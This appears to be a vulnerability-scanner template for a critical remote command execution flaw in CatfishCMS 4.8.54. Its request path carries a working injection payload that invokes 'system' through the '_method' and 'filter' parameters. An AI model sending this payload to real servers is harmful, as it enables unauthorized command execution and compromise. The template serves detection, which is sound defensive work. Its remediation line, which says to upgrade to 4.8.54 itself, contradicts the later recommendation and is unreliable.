id: CNVD-2019-06255
info:
  name: CatfishCMS RCE
  author: Lark-Lab
  severity: critical
  description: The CatfishCMS 4.8.54 version has a remote command execution vulnerability
    in the "method" parameter, identified as CNVD-2019-06255.
  reference:
  - https://its401.com/article/yun2diao/91344725
  - https://github.com/xwlrbh/Catfish/issues/4
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  remediation: Upgrade to CatfishCMS version 4.8.54 or later.
  tags: rce,cnvd,catfishcms,cnvd2019
  metadata:
    impact: The impact of the CNVD-2019-06255 vulnerability in CatfishCMS 4.8.54 is
      that it allows for remote command execution through the "method" parameter,
      potentially leading to unauthorized access, data theft, or a full system compromise.
    recommendation: It is recommended to update CatfishCMS to a version higher than
      4.8.54 to mitigate the risk of remote command execution.
requests:
- method: GET
  path:
  - '{{BaseURL}}/s=set&_method=__construct&method=*&filter[]=system'
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    words:
    - OS
    - PATH
    - SHELL
    - USER
    condition: and
